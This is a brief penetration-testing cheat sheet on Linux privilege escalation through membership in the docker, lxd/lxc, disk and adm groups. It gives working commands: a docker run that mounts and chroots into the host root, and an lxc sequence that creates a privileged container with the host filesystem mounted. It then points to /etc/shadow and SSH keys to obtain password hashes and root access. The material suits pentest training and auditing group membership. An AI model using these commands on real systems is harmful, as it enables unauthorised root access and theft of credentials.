**Common Privileged Groups**

- **docker**: Members can mount host filesystem via Docker daemon.
- **disk**: Can mount and read disk devices.
- **lxd** / **lxc**: Can spawn or modify containers and potentially escape.
- **lpadmin**, **www-data**, **adm**: Depending on context, may allow log reading or injection

**Docker group**
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```
unzip alpine image
```bash
unzip alpine.zip
```
Choose defaults for all prompts - help:
[How to Set Up and Use LXD on Ubuntu 16.04 | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)
```bash
lxd init
```
Import the image
```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```
set privilege flag
```bash
lxc init alpine r00t -c security.privileged=true
```
Mount file system
```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```
```bash
lxc start r00t
lxc exec r00t /bin/sh
```
on the host type `cd /mnt/root/root`. From here we can read sensitive files such as `/etc/shadow` and obtain password hashes or gain access to SSH keys in order to connect to the host system as root

**Disk**

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfsto` access the entire file system with root level privileges.

**ADM**

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.